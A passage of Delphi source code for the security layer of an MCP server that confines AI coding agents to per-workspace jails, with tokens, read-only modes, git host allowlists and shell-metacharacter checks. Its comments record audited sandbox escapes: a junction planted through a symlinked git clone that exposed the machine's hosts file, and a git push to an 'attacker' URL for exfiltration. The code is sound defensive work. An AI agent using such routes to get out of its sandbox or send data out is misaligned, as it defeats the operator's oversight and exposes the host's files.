  Y estaba en las 32 llamadas del servidor, no en una: con dos agentes
  trabajando a la vez, cualquiera podia perder. Por eso se arregla aqui y no
  alli - si el resultado es que la carpeta esta, da igual quien la creo. }
procedure CrearCarpeta(const ADir: string);

{ Host names git may talk to when an agent writes an explicit URL, comma
  separated; '' (the default) means none - see GitRemoteDenied. }
function GitRemoteHosts: string;   // DELPHI_MCP_GIT_REMOTES / GitRemotes=

{ Host names delphi_paserver may DIAL when the caller names one by hand
  (test-connection host=...) O cuando un comando marca por perfil, comma
  separated. Tener un perfil en el IDE NO da permiso: cuenta SOLO la lista
  del workspace activo (v0.98; medido que el perfil ajeno marcaba igual). }
function RemoteProbeHosts: string; // DELPHI_MCP_REMOTE_HOSTS / RemoteHosts=

{ Whether the READ-ONLY library zone exists at all. Default True (reading the
  RTL and the installed components is what makes an agent competent here).
  LibraryZone=0 en el workspace lo corta: reads are then confined to the workspace
  roots, exactly like writes. Field 2026-08-24: an agent noted that the zone
  GROWS by itself with every component or SDK installed, so the operator
  deserves a way to say no. }
function LibraryZoneEnabled: Boolean; // DELPHI_MCP_LIBRARY_ZONE=0 / LibraryZone=0

{ '' when APath (a .dproj) may be executed remotely, else a refusal. La
  lista es la del workspace ACTIVO (RemoteRunProjects= en su seccion), sin
  herencia, y VACIA significa NADA ejecutable: fallar abierto aqui era la
  excepcion de todo el servidor y se retiro el 19-sep-2026 (v0.98: nada
  global, ni seccion global). Field 2026-08-24: an agent working on project A could
  run the deployed binary of project B. }
function RemoteRunProjectDenied(const APath: string): string;

{ Read-only mode. Two independent sources, OR-ed together:
  - process-wide: the whole server runs read-only (--readonly flag);
  - per-request: the HTTP transport marks the current worker thread according
    to which credential the request presented (full token = read-write,
    read-only token / anonymous read-only = read-only). }
procedure SetProcessReadOnly(AValue: Boolean);
procedure SetRequestReadOnly(AValue: Boolean);

{ Whether the CURRENT request/process is read-only (for delphi_workspace). }
function IsReadOnlyNow: Boolean;

{ THE single entry gate, consulted by the tools dispatcher before ANY tool
  executes. '' = allowed; otherwise the rejection message returned to the
  agent. In read-only mode every mutating tool is refused; delphi_git is
  mixed and resolved by its "command" argument (query commands pass).
  It also NORMALIZES the arguments in place: virtual drive units
  (srvd:\x -> D:\x) are expanded here, before any check or tool. }
{ Cuantos parametros de todo el contrato vigila el suelo de la jaula: los
  marcados [RutaDelServidor], leidos por RTTI del registro real de tools. Se
  publica (delphi_workspace) para que un suelo VACIO se pueda ver: es una
  capa redundante, y si dejase de funcionar no romperia nada. }
function ServerPathParamCount: Integer;

{ La mitad de CONSULTA de delphi_git: lo que una credencial de solo lectura
  y un proyecto de REFERENCIA (ReadOnlyRoots) pueden ejecutar. UNA lista:
  la consulta ToolCallDenied y la consulta la propia tool. }
function GitCommandIsQuery(const ACmd, AArgs, AMessage: string): Boolean;

function ToolCallDenied(const AToolName: string;
  const AArguments: TJSONObject): string;

{ Virtual drive units. The drive letters of this SERVER travel to the client
  as srvd:, srvc:, ... so a model never mistakes server paths for its own
  local disks (measured confusion in the field test). Round trip:
  - inbound: the entry gate expands srvX: in tool arguments (whole-value
    prefix match only, and never inside content-carrying parameters);
  - outbound: MaskDriveText rewrites every served drive prefix in a tool's
    textual result - one generic rule, so compiler/git/LSP output and even
    8.3 short forms (D:\PROYEC~1) are covered - EXCEPT for byte-fidelity
    tools (delphi_read / delphi_fetch), whose text is file content and must
    reach the client verbatim (an edit anchor built from masked text would
    not match the disk). }
function MaskDriveText(const AToolName, AText: string): string;

{ Inbound expansion of ONE value ('srvd:\x' -> 'D:\x'; anything else
  untouched, an unserved unit stays literal). Exposed for the /files download
  route, which receives its path as a query parameter, not as a tools/call
  argument - the same door, entered from HTTP. }
function ExpandDriveValue(const AValue: string): string;

{ The letter of a value shaped like a virtual unit ('srvd:', 'srvd:\x'),
  #0 otherwise. After ExpandDriveValue a non-#0 answer means an UNSERVED
  unit: refuse it by name, never let it near GetFullPath. }
function VirtualUnitLetter(const AValue: string): Char;

{ Expands $(NAME) macros with the IDE's environment table (AVars as
  NAME=VALUE, see Lsp.Discovery.IdeEnvironmentVars). Exposed for the search
  path vetting of delphi_config: a path with macros must resolve before the
  jail can judge it. }
function ExpandIdeMacros(const AText: string; AVars: TStrings): string;

{ '' when AText carries none of the shell metacharacters that would break a
  command line ( ; | & ` $ < > and newlines ), otherwise a refusal. For tool
  arguments that end up on a paclient/msbuild command line. }
function ShellArgDenied(const AText: string): string;

{ Whether a git argument names a remote the operator has NOT allowed.

  Measured 2026-08-25 by an auditor working only through MCP: `delphi_git
  command=fetch args="http://127.0.0.1:3131/mcp"` made the SERVER open a
  connection to that address, and `push https://attacker/... HEAD:main` would
  have walked the jail's contents out of the building. The agent's universe is
  supposed to end at the jail; an arbitrary outbound URL turns the server into
  a proxy into its own network (localhost, internal services, metadata
  endpoints) and into an exfiltration channel.

  So: an EXPLICIT url in a git argument must match GitRemotes= del workspace
  activo, a
  comma-separated list of host names the operator wrote down. With that
  setting empty - the default - explicit URLs are refused outright. The remotes
  the OPERATOR configured in the repository keep working untouched (`push
  origin main` names a remote, not a URL): the decision about where this
  machine may talk to belongs to whoever owns the machine. }
function GitRemoteDenied(const AText: string): string;

implementation

uses
  Winapi.Windows,
  System.SysUtils,
  System.StrUtils,
  System.IniFiles,
  System.IOUtils,
  System.SyncObjs,
  System.Generics.Collections,
  System.Rtti,
  MCPServer.Serializer, // NormalizeKey: ONE rule for argument names
  MCPServer.Tool.Base,     // IMCPToolParams: la clase de parametros de una tool
  MCPServer.Registration,  // el registro REAL de tools, no una lista nuestra
  Lsp.Attributes,          // [RutaDelServidor]
  Lsp.Dproj,            // CanonicalPlatform: the platform whitelist already exists
  System.RegularExpressions,
  System.Hash,
  Lsp.Patch,            // TrashFolderName: el nombre de la papelera, de SU nombrador
  Lsp.Texts;

type
  { A token-scoped sandbox from a [Workspace.<name>] section. }
  TWorkspaceDef = record
    Name, Token, ReadOnlyToken, Profile: string;
    Roots: TArray<string>;
    // Carpetas de DENTRO del root que se leen pero no se escriben. Mismo
    // trato que la zona de biblioteca del IDE, que ya existia con esa
    // semantica pero cableada. Nace el 20-sep-2026: el root de este repo
    // contiene dos clones de referencia con su PROPIO git (gdk-mcp,
    // skybuck-mcp), y estrechar la jaula al repo los metio dentro con
    // permiso de escritura. Como son repos aparte, un descuido ahi ni
    // siquiera aparece en el "git status" del principal. David no quiere
    // sacarlos fuera, y tiene razon: lo relacionado con el proyecto vive en
    // la carpeta del proyecto, que es lo que encuentra quien lo clona. Asi
    // que la proteccion la pone la configuracion, no la memoria del agente.
    ReadOnlyPaths: TArray<string>;
    ReadOnlyRoots: TArray<string>;    // proyectos de referencia: se leen, no se escriben
    Invalid: Boolean; // Roots= had text but nothing parsed: fail closed
    // Capacidades del workspace. Desde el 19-sep-2026 (v0.98) NO se
    // hereda NADA de ningun sitio (decision David, rematando la del
    // 2026-09-11: "cada workspace lleva su par, sus roots Y sus configs").
    // Un workspace con nombre tiene EXACTAMENTE lo que declara: tri-estado
    // ausente (-1) = APAGADO, lista ausente = VACIA = nada permitido. Las
    // G* de este modulo alimentan SOLO el modo local de lanzamiento (el
    // entorno de quien arranca el proceso: baterias, desarrollo); el ini
    // NO tiene seccion generica desde v0.98.
    OvAllowTests, OvAllowRemoteRun, OvAllowBuildScripts,
      OvLibraryZone, OvAgentConfinement: Integer;
    OvSharedSet: Boolean;             // SharedFolders= present in the section
    OvSharedFolders: TArray<string>;
    // A donde puede llegar ESTE workspace: sin declarar = a ninguna parte.
    GitRemotes: string;               // hosts que un git clone/push puede nombrar
    RemoteHosts: string;              // hosts que un dial PAServer puede marcar
    DelphiVersion: string;            // DelphiVersion=36.0: que RAD Studio usa ('' = la mas nueva con DelphiLSP)
    RemoteProjects: TArray<string>;   // proyectos ejecutables en un target
    VaultPath: string;                // vault de conocimiento de ESTE workspace
    OvVaultReadOnly: Integer;         // tri-estado: ausente = solo lectura
    AdbDevices: TArray<string>;       // dispositivos delphi_adb; ausente = ninguno
  end;

var
  // Modo local de lanzamiento (baterias, desarrollo): lo carga LoadSecurity
  // con todo lo demas. Sin banderas perezosas por clave (25-sep-2026).
  GRoots: TArray<string>;
  GRootsInvalid: Boolean = False; // Roots= had text but NO valid root: fail closed
  GRoPaths: TArray<string>;       // ReadOnlyPaths del modo local
  GRoRoots: TArray<string>;       // ReadOnlyRoots del modo local
  GVaultEnvWritable: Boolean = False; // DELPHI_MCP_VAULT_READONLY=0
  GProcessReadOnly: Boolean = False;
  GSecLoaded: Boolean = False;
  GAuthToken: string;
  GIdentLock: TCriticalSection;
  GSesiones: TList<TSesion>;  // sesiones HTTP: id, nombre atado en initialize, ultimo uso
  GSessionTimeoutMin: Double = -1; // -1 = sin leer todavia
  GIniBindIP: string;              // [Server] BindIP
  GIniSessionTimeout: string;      // [Server] SessionTimeoutMinutes, sin parsear
  GIniLogLines: Integer = 2000;    // [Log] LinesPerFile
  GIniLogMaxFiles: Integer = 10;   // [Log] MaxFiles

  GReadOnlyToken: string;
  GAllowRemoteRun: Boolean = False; // remote-run is OFF unless opted in
  GLibraryZone: Boolean = True;     // the read-only library zone, on by default
  GDelphiVersion: string = '';      // DELPHI_MCP_DELPHI_VERSION (modo local de lanzamiento)
  GAllowTests: Boolean = False;     // running test suites is opt-in too
  GGitRemotes: string = '';         // hosts an explicit git URL may name
  GRemoteHosts: string = '';        // hosts a raw TCP probe may dial
  GRemoteProjects: TArray<string>;  // RemoteRunProjects del [Workspace] por defecto
  GAllowBuildScripts: Boolean = False; // build scripts OFF unless explicitly opted in
  GAgentConfinement: Boolean = False; // each agent to its own subfolder: OFF by default
  // [Tools] Profile: which tools appear in tools/list (all stay callable).
  // full (default) | coder (hides the deploy trio) | reader (LSP + reading).
  // GToolsOnly (Only=) is an explicit allowlist that overrides the profile.
  GToolsProfile: string = 'full';
  GToolsOnly: TArray<string>;
  GSharedFolders: TArray<string>;     // subfolders any agent may write (opt-in)
  GWorkspaces: TArray<TWorkspaceDef>; // [Workspace.*]: token -> its own jail
  GWorkspaceNotes: TArray<string>;    // startup findings about that config
  GAdbDevices: TArray<string>;      // DELPHI_MCP_ADB_DEVICES (lanzamiento local)
  GVaultPath: string = '';          // DELPHI_MCP_VAULT_PATH (lanzamiento local)

threadvar
  TCurrentAgent: string; // WHO is calling on THIS thread (the HTTP request)
  GRequestReadOnly: Boolean;
  TRequestWorkspaceIx1: Integer; // workspace de la peticion HTTP (lo pone el transporte)

var
  GStdioIx1: Integer = 0; // workspace abierto por DELPHI_MCP_TOKEN (proceso stdio)

{ El workspace activo de ESTA llamada, indice+1; 0 = ninguno. El transporte
  HTTP lo fija por peticion; en un proceso local (stdio) vale el que abrio
  el token del entorno al cargar la seguridad - asi el cliente local tambien
  entra "con su token" cuando lo tiene, y sin token se queda en el modo
  local de lanzamiento que definan las variables de entorno. }
function TWorkspaceIx1: Integer;
begin
  Result := TRequestWorkspaceIx1;
  if Result = 0 then
    Result := GStdioIx1;
end;

{ EL resolvedor del workspace activo: la UNICA forma de preguntar "que vale
  para esta sesion". Antes cada accesor repetia el par "si hay workspace
  activo, su campo; si no, el global" (18 copias medidas el 25-sep-2026):
  una clave nueva obligaba a escribir las dos mitades a mano, y olvidar la
  del workspace hacia caer la clave al global SIN RUIDO - un token con un
  permiso que otro operador declaro para otro token. La regla de v0.98 ("un
  workspace tiene exactamente lo que declara") la cumplian 18 copias; ahora
  la cumple este par. David: "si una aplicacion repite mucho una accion hay
  que centralizarla con parametros, por salud del codigo". }
function HasActiveWS: Boolean;
begin
  Result := (TWorkspaceIx1 > 0) and (TWorkspaceIx1 <= Length(GWorkspaces));
end;

function ActiveWS: TWorkspaceDef;
begin
  Result := GWorkspaces[TWorkspaceIx1 - 1];
end;

{ 'a;b;c' -> resolved roots with trailing delimiter; quotes tolerated,
  unparseable entries ignored. Shared by the global Roots= and every
  [Workspace.*] Roots=. }
{ El nombre FINAL de una ruta que existe: sigue junctions y symlinks hasta su
  destino de verdad. False si no se puede abrir (no existe, o no hay permiso
  ni para preguntar). Acceso 0 = solo consultar, y FILE_FLAG_BACKUP_SEMANTICS
  hace falta para poder abrir CARPETAS. }
{ EL paseo hacia arriba, escrito UNA vez. Dada una ruta, busca el antecesor
  existente mas cercano que AResuelve sepa traducir y le vuelve a pegar el
  resto: el ultimo tramo de un create o un upload todavia no existe, y aun asi
  hay que canonicalizar el camino ANTES de que ningun guarda lo mire.

  Estaba escrito DOS veces. LongCanonical lo tenia desde siempre (8.3 ->
  nombre largo), y el 20-sep-2026, para cerrar el escape por junctions, escribi
  RealPath con el MISMO bucle y otra llamada de Windows - sin mirar si habia
  algo aprovechable, teniendolo en esta misma unidad. Entre las dos cambia UNA
  linea, el resolutor; el paseo era identico. Ahora es uno. }
type
  TResuelveTramo = reference to function(const ADir: string;
    out ASalida: string): Boolean;

function CanonicalSubiendo(const AFull: string;
  const AResuelve: TResuelveTramo): string;
var
  Dir, Tail, Parent, Resuelto: string;
begin
  Dir := AFull;
  Tail := '';
  while Dir <> '' do
  begin
    if AResuelve(Dir, Resuelto) then
    begin
      Result := Resuelto;
      if Tail <> '' then
        Result := IncludeTrailingPathDelimiter(Result) + Tail;
      Exit;
    end;
    Parent := TPath.GetDirectoryName(Dir);
    if (Parent = '') or SameText(Parent, Dir) then
      Break;
    if Tail = '' then
      Tail := TPath.GetFileName(Dir)
    else
      Tail := TPath.GetFileName(Dir) + '\' + Tail;
    Dir := Parent;
  end;
  Result := AFull; // nada del camino existe: se queda la forma textual
end;

function NombreFinal(const APath: string; out AReal: string): Boolean;
var
  H: THandle;
  Len: DWORD;
  Buf: array [0 .. 32767] of Char;
begin
  Result := False;
  AReal := '';
  H := CreateFile(PChar(APath), 0,
    FILE_SHARE_READ or FILE_SHARE_WRITE or FILE_SHARE_DELETE, nil,
    OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, 0);
  if H = INVALID_HANDLE_VALUE then
    Exit;
  try
    // flags 0 = FILE_NAME_NORMALIZED + VOLUME_NAME_DOS, que es lo que
    // queremos: la ruta con letra de unidad, normalizada.
    Len := GetFinalPathNameByHandle(H, Buf, Length(Buf) - 1, 0);
    if (Len = 0) or (Len >= DWORD(Length(Buf))) then
      Exit;
    SetString(AReal, PChar(@Buf[0]), Len);
    // GetFinalPathNameByHandle devuelve la forma extendida.
    if AReal.StartsWith('\\?\UNC\') then
      AReal := '\\' + AReal.Substring(8)
    else if AReal.StartsWith('\\?\') then
      AReal := AReal.Substring(4);
    Result := AReal <> '';
  finally
    CloseHandle(H);
  end;
end;

{ LA RUTA REAL, que es contra la que hay que medir la jaula.

  TPath.GetFullPath normaliza el TEXTO y no sigue reparse points, asi que un
  junction o un symlink creado DENTRO del root apuntando fuera pasaba el
  control y el sistema de ficheros servia el destino de verdad. Medido el
  2026-09-20 por un agente auditor: un junction a
  C:\Windows\System32\drivers\etc dentro del root hizo que delphi_list y
  delphi_read devolvieran el hosts de la maquina. Y no hace falta consola para
  plantarlo: un git clone con core.symlinks=true mete el enlace sin salir del
  MCP, o sea que era alcanzable por el propio agente.

  Si la ruta NO existe todavia (crear un fichero nuevo, por ejemplo), se
  resuelve el ANTECESOR existente mas cercano y se le vuelve a pegar el resto:
  lo que importa es que ningun tramo del camino salte fuera. Si no existe
  nada del camino, se queda la normalizacion textual, que es lo que habia. }
function RealPath(const APath: string): string;
var
  Base: string;
begin
  Result := APath;
  try
    Base := ExcludeTrailingPathDelimiter(TPath.GetFullPath(APath));
  except
    Exit;
  end;
  Result := CanonicalSubiendo(Base,
    function(const ADir: string; out ASalida: string): Boolean
    var
      A: Cardinal;
    begin
      // Un fichero NORMAL no se abre: solo un enlace redirige, y su ruta real
      // es la real de su carpeta mas su nombre largo (LongCanonical no abre
      // el fichero). Abrirlo para pedirle el nombre final le quitaba el
      // rename a otro escritor en ese instante: con un handle abierto, aunque
      // comparta el borrado, MoveFileEx no puede reemplazarlo - "rename
      // atomico fallido" y una edicion perdida en test_concurrencia (A y C,
      // 25-sep-2026, al crecer las comparaciones por ruta real).
      A := GetFileAttributes(PChar(ADir));
      if (A <> INVALID_FILE_ATTRIBUTES) and
         ((A and (FILE_ATTRIBUTE_DIRECTORY or FILE_ATTRIBUTE_REPARSE_POINT)) = 0) then
      begin
        Result := NombreFinal(TPath.GetDirectoryName(ADir), ASalida);
        if Result then
          ASalida := IncludeTrailingPathDelimiter(ExcludeTrailingPathDelimiter(ASalida)) +
            TPath.GetFileName(LongCanonical(ADir));
        Exit;
      end;
      Result := NombreFinal(ADir, ASalida);
      if Result then
        ASalida := ExcludeTrailingPathDelimiter(ASalida);
    end);
end;

{ Las rutas de SOLO LECTURA de un workspace. Una entrada ABSOLUTA vale tal
  cual; una RELATIVA se resuelve contra CADA root, que es como la lee quien la
  escribe ("gdk-mcp" = la carpeta gdk-mcp de mi proyecto). No se puede reusar
  ParseRootsList para esto: aquella resuelve lo relativo contra el directorio
  ACTUAL del proceso, que bajo el SCM es system32. Misma forma canonica que
  los roots - con barra final - para que la comparacion de despues sea la
  misma y no una parecida. }
function ParseReadOnlyList(const ARaw: string;
  const ARoots: TArray<string>): TArray<string>;
var
  List: TStringList;
  E, R, V: string;
begin
  List := TStringList.Create;
  try
    for E in ARaw.Split([';']) do
    begin
      V := E.Trim.Trim(['"']).Trim;
      if V = '' then
        Continue;
      try
        if TPath.IsPathRooted(V) then
          List.Add(IncludeTrailingPathDelimiter(TPath.GetFullPath(V)))
        else
          for R in ARoots do
            List.Add(IncludeTrailingPathDelimiter(
              TPath.GetFullPath(TPath.Combine(R, V))));
      except
        // una entrada que no parsea se ignora, nunca tumba el servidor
      end;
    end;
    Result := List.ToStringArray;
  finally
    List.Free;
  end;
end;

function ParseRootsList(const ARaw: string): TArray<string>;
var
  List: TStringList;
  R: string;
begin
  List := TStringList.Create;
  try
    for R in ARaw.Split([';']) do
      if R.Trim.Trim(['"']).Trim <> '' then
      try
        List.Add(IncludeTrailingPathDelimiter(
          TPath.GetFullPath(R.Trim.Trim(['"']).Trim)));
      except
        // an unparseable root is ignored, never crashes the server
      end;
    Result := List.ToStringArray;
  finally
    List.Free;
  end;
end;

{ Confinamiento y carpetas compartidas: la declaracion del workspace, sin herencia. }
function AgentConfinementNow: Boolean;
begin
  if HasActiveWS then
    Exit(ActiveWS.OvAgentConfinement = 1); // ausente = apagado
  Result := GAgentConfinement;
end;

function SharedFoldersNow: TArray<string>;
begin
  if HasActiveWS then
    Exit(ActiveWS.OvSharedFolders); // ausente = ninguna
  Result := GSharedFolders;
end;

{ 1 / 0 when the key is present in the section, -1 (inherit) when absent. }
function ReadTriState(AIni: TIniFile; const ASection, AKey: string): Integer;
begin
  if not AIni.ValueExists(ASection, AKey) then
    Exit(-1);
  if AIni.ReadBool(ASection, AKey, False) then
    Result := 1
  else
    Result := 0;
end;

procedure SetRequestWorkspace(AIx: Integer);
begin
  TRequestWorkspaceIx1 := AIx + 1;
end;

function SettingsIniPath: string;
begin
  Result := ServerDir('settings.ini');
end;

function CurrentWorkspaceName: string;
begin
  if HasActiveWS then
    Result := ActiveWS.Name
  else
    Result := '';
end;

function WorkspaceTokensConfigured: Boolean;
var
  W: TWorkspaceDef;
begin
  for W in GWorkspaces do
    if (W.Token <> '') or (W.ReadOnlyToken <> '') then
      Exit(True);
  Result := False;
end;

function WorkspaceStartupNotes: TArray<string>;
var
  Names: string;
  W: TWorkspaceDef;
begin
  Result := [];
  Names := '';
  for W in GWorkspaces do
  begin
    if Names <> '' then
      Names := Names + ', ';
    Names := Names + W.Name;
  end;
  if Names <> '' then
    Result := Result + ['Workspaces: ' + Names];
  Result := Result + GWorkspaceNotes;
end;

function AuthorizeBearer(const AAuth: string; out AReadOnly: Boolean;
  out AWorkspaceIx: Integer): Boolean;
var
  I: Integer;
begin
  AReadOnly := False;
  AWorkspaceIx := -1;
  // O WORKSPACE O NADA (v0.91; rematado 2026-09-19): un Bearer autentica
  // SOLO contra un [Workspace.<nombre>]. Sin coincidencia, 401 - ya no hay
  // modo abierto "sin configurar" ni anonimo de solo lectura. El modo de
  // confianza queda para el proceso LOCAL (stdio) que lanza el operador.
  // workspace tokens: the secret decides the jail, not the declared name
  for I := 0 to High(GWorkspaces) do
  begin
    // fail closed: a workspace without a valid jail admits nobody
    if GWorkspaces[I].Invalid or (Length(GWorkspaces[I].Roots) = 0) then
      Continue;
    if (GWorkspaces[I].Token <> '') and
       (AAuth = 'Bearer ' + GWorkspaces[I].Token) then
    begin
      AWorkspaceIx := I;
      Exit(True);
    end;
    if (GWorkspaces[I].ReadOnlyToken <> '') and
       (AAuth = 'Bearer ' + GWorkspaces[I].ReadOnlyToken) then
    begin
      AWorkspaceIx := I;
      AReadOnly := True;
      Exit(True);
    end;
  end;
  Result := False;
end;

procedure SetProcessReadOnly(AValue: Boolean);
begin
  GProcessReadOnly := AValue;
end;

procedure SetRequestReadOnly(AValue: Boolean);
begin
  GRequestReadOnly := AValue;
end;

function IsReadOnlyNow: Boolean;
begin
  Result := GProcessReadOnly or GRequestReadOnly;
  if not Result then
    // Excepcion local sin token, SOLO LECTURA (David 2026-09-19, "menos
    // sustos"): sin workspace activo y sin jaula declarada en el entorno
    // se puede MIRAR todo el codigo pero no tocar nada. Solo alcanzable en
    // stdio: todo HTTP entra con token de workspace o recibe 401 antes.
    Result := (TWorkspaceIx1 = 0) and (Length(WorkspaceRoots) = 0);
end;

procedure ParseAdbDevices(const ARaw: string);
var
  E: string;
begin
  if ARaw.Trim = '' then
    Exit;
  for E in ARaw.Split([';']) do
    if E.Trim <> '' then
      GAdbDevices := GAdbDevices + [E.Trim];
end;

{ Un copia-pega futuro puede dejar el MISMO token en dos [Workspace.*], la
  misma clave dos veces en una seccion, o la misma seccion dos veces. TIniFile
  no avisa de nada de eso: coge lo primero y calla, y un agente entra en una
  jaula que no es la suya sin que nadie lo vea. Los workspaces afectados se
  CIERRAN (fail closed, el mismo Invalid que unas Roots que no parsean) y el
  arranque lo dice (David, 2026-09-23). }
procedure ComprobarDuplicadosIni(const AIniPath: string);
var
  I, J, P: Integer;
  Lineas: TArray<string>;
  Seccion, T, Clave: string;
  Claves, Secciones: TStringList;

  procedure Cierra(const ANombre: string);
  var
    K: Integer;
  begin
    for K := 0 to High(GWorkspaces) do
      if SameText(GWorkspaces[K].Name, ANombre) then
        GWorkspaces[K].Invalid := True;
  end;

  function Comparten(const A, B: TWorkspaceDef): Boolean;
  begin
    Result := ((A.Token <> '') and ((A.Token = B.Token) or (A.Token = B.ReadOnlyToken))) or
      ((A.ReadOnlyToken <> '') and ((A.ReadOnlyToken = B.Token) or (A.ReadOnlyToken = B.ReadOnlyToken)));
  end;

begin
  // 1. el mismo secreto en dos workspaces, o Token = ReadOnlyToken en uno
  for I := 0 to High(GWorkspaces) do
  begin
    if (GWorkspaces[I].Token <> '') and (GWorkspaces[I].Token = GWorkspaces[I].ReadOnlyToken) then
    begin
      GWorkspaces[I].Invalid := True;
      GWorkspaceNotes := GWorkspaceNotes +
        ['AVISO: [Workspace.' + GWorkspaces[I].Name + '] tiene el MISMO valor en ' +
         'Token= y ReadOnlyToken=: no se sabe si quien entra puede escribir. ' +
         'CERRADO (fail closed) hasta que sean distintos.'];
    end;
    for J := I + 1 to High(GWorkspaces) do
      if Comparten(GWorkspaces[I], GWorkspaces[J]) then
      begin
        GWorkspaces[I].Invalid := True;
        GWorkspaces[J].Invalid := True;
        GWorkspaceNotes := GWorkspaceNotes +
          ['AVISO: [Workspace.' + GWorkspaces[I].Name + '] y [Workspace.' +
           GWorkspaces[J].Name + '] comparten un token (copia-pega): con el ' +
           'mismo secreto no se sabe que jaula toca. Los DOS quedan CERRADOS ' +
           '(fail closed) hasta que cada uno tenga el suyo.'];
      end;
  end;
  // 2. la misma clave dos veces en una seccion, o la misma seccion dos veces
  try
    Lineas := TFile.ReadAllLines(AIniPath);
  except
    Exit;
  end;
  Claves := TStringList.Create;
  Secciones := TStringList.Create;
  try
    Claves.CaseSensitive := False;
    Secciones.CaseSensitive := False;
    Seccion := '';
    for var L in Lineas do
    begin
      T := L.Trim;
      if (T = '') or T.StartsWith(';') or T.StartsWith('#') then
        Continue;
      if T.StartsWith('[') and T.EndsWith(']') then
      begin
        Seccion := T.Substring(1, T.Length - 2).Trim;
        if Secciones.IndexOf(Seccion) >= 0 then
        begin
          if Seccion.StartsWith('Workspace.', True) then
          begin
            Cierra(Seccion.Substring(Length('Workspace.')));
            GWorkspaceNotes := GWorkspaceNotes +
              ['AVISO: la seccion [' + Seccion + '] aparece DOS veces en ' +
               'settings.ini y el ini solo lee la primera. Ese workspace ' +
               'queda CERRADO (fail closed) hasta que sea una sola.'];
          end
          else
            GWorkspaceNotes := GWorkspaceNotes +
              ['AVISO: la seccion [' + Seccion + '] aparece DOS veces en ' +
               'settings.ini y el ini solo lee la primera: fusionalas.'];
        end
        else
          Secciones.Add(Seccion);
        Continue;
      end;
      P := T.IndexOf('=');
      if P <= 0 then
        Continue;
      Clave := Seccion + '|' + T.Substring(0, P).Trim;
      if Claves.IndexOf(Clave) >= 0 then
      begin
        if Seccion.StartsWith('Workspace.', True) then
        begin
          Cierra(Seccion.Substring(Length('Workspace.')));
          GWorkspaceNotes := GWorkspaceNotes +
            ['AVISO: [' + Seccion + '] repite la clave ' + T.Substring(0, P).Trim +
             ' y el ini solo lee la primera. Ese workspace queda CERRADO ' +
             '(fail closed) hasta que la clave sea una sola.'];
        end
        else
          GWorkspaceNotes := GWorkspaceNotes +
            ['AVISO: [' + Seccion + '] repite la clave ' + T.Substring(0, P).Trim +
             ': el ini solo lee la primera y la segunda se ignora en silencio.'];
      end
      else
        Claves.Add(Clave);
    end;
  finally
    Claves.Free;
    Secciones.Free;
  end;
end;

procedure LoadSecurity;
var
  IniPath: string;
  Ini: TIniFile;
begin
  if GSecLoaded then
    Exit;
  ParseAdbDevices(GetEnvironmentVariable('DELPHI_MCP_ADB_DEVICES'));
  GDelphiVersion := GetEnvironmentVariable('DELPHI_MCP_DELPHI_VERSION').Trim;
  GAuthToken := GetEnvironmentVariable('DELPHI_MCP_TOKEN');
  GReadOnlyToken := GetEnvironmentVariable('DELPHI_MCP_READONLY_TOKEN');
  GAllowRemoteRun := GetEnvironmentVariable('DELPHI_MCP_ALLOW_REMOTE_RUN') = '1';
  GLibraryZone := GetEnvironmentVariable('DELPHI_MCP_LIBRARY_ZONE') <> '0';
  GAllowTests := GetEnvironmentVariable('DELPHI_MCP_ALLOW_TESTS') = '1';
  GGitRemotes := GetEnvironmentVariable('DELPHI_MCP_GIT_REMOTES');
  GRemoteHosts := GetEnvironmentVariable('DELPHI_MCP_REMOTE_HOSTS');
  GRemoteProjects := GetEnvironmentVariable('DELPHI_MCP_REMOTE_RUN_PROJECTS')
    .Split([';'], TStringSplitOptions.ExcludeEmpty);
  GVaultPath := GetEnvironmentVariable('DELPHI_MCP_VAULT_PATH');
  GAllowBuildScripts := GetEnvironmentVariable('DELPHI_MCP_ALLOW_BUILD_SCRIPTS') = '1';
  GAgentConfinement := GetEnvironmentVariable('DELPHI_MCP_AGENT_CONFINEMENT') = '1';
  GToolsProfile := LowerCase(GetEnvironmentVariable('DELPHI_MCP_TOOLS_PROFILE').Trim);
  if GToolsProfile = '' then
    GToolsProfile := 'full';
  GToolsOnly := LowerCase(GetEnvironmentVariable('DELPHI_MCP_TOOLS_ONLY'))
    .Split([',', ';'], TStringSplitOptions.ExcludeEmpty);
  GSharedFolders := LowerCase(GetEnvironmentVariable('DELPHI_MCP_SHARED_FOLDERS'))
    .Split([',', ';'], TStringSplitOptions.ExcludeEmpty);
  // Las claves de JAULA del modo local, aqui con las demas: hasta el
  // 25-sep-2026 Roots, ReadOnlyPaths, ReadOnlyRoots y VaultReadOnly se
  // leian cada una en su primer uso, con su propia cache - cuatro
  // cargadores mas que este, y cuatro sitios donde olvidar una mitad.
  var RawRootsEnv := GetEnvironmentVariable('DELPHI_MCP_ROOTS');
  GRoots := ParseRootsList(RawRootsEnv);
  // Fail CLOSED: Roots con texto pero nada parseado = nada permitido.
  GRootsInvalid := (RawRootsEnv.Trim <> '') and (Length(GRoots) = 0);
  GRoPaths := ParseReadOnlyList(GetEnvironmentVariable('DELPHI_MCP_READONLY_PATHS'), GRoots);
  GRoRoots := ParseRootsList(GetEnvironmentVariable('DELPHI_MCP_READONLY_ROOTS'));
  // El entorno gana en AMBOS sentidos para el vault del modo local (las
  // baterias fuerzan un vault de solo lectura por encima de cualquier ini).
  GVaultEnvWritable := GetEnvironmentVariable('DELPHI_MCP_VAULT_READONLY') = '0';
  IniPath := SettingsIniPath;
  if TFile.Exists(IniPath) then
  begin
    Ini := TIniFile.Create(IniPath);
    try
      // v0.98 (David): el ini NO tiene seccion generica - todo permiso
      // vive en un [Workspace.<nombre>]; el modo local de lanzamiento se
      // define SOLO por el entorno de quien arranca el proceso. Del ini,
      // fuera de los workspaces, solo queda fontaneria ([Server]/[Tools]).
      if GToolsProfile = 'full' then
        GToolsProfile := LowerCase(Ini.ReadString('Tools', 'Profile', 'full').Trim);
      if Length(GToolsOnly) = 0 then
        GToolsOnly := LowerCase(Ini.ReadString('Tools', 'Only', ''))
          .Split([',', ';'], TStringSplitOptions.ExcludeEmpty);
      // La fontaneria de [Server] y [Log], aqui con las demas: hasta el
      // 26-sep BindIP, SessionTimeoutMinutes y el [Log] de la bandeja
      // abrian el fichero cada uno por su cuenta (tres lectores mas).
      GIniBindIP := Ini.ReadString('Server', 'BindIP', '');
      GIniSessionTimeout := Ini.ReadString('Server', 'SessionTimeoutMinutes', '').Trim;
      GIniLogLines := Ini.ReadInteger('Log', 'LinesPerFile', 2000);
